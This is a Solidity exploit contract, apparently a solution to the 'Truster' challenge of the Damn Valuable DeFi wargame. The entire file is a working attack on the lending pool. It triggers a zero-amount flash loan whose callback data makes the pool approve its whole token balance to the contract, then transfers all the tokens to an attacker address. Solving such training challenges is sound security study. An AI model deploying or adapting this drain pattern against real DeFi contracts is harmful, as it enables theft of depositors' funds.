/// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../truster/TrusterLenderPool.sol";

contract TrusterLenderExploit {
    constructor(
        address poolAddress,
        address tokenAddress,
        address attacker
    ) {
        TrusterLenderPool pool = TrusterLenderPool(poolAddress);
        DamnValuableToken token = DamnValuableToken(tokenAddress);
        uint256 poolBalance = token.balanceOf(poolAddress);
        bytes memory approveExploit = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );
        pool.flashLoan(0, address(this), tokenAddress, approveExploit);
        token.transferFrom(poolAddress, attacker, poolBalance);
    }
}
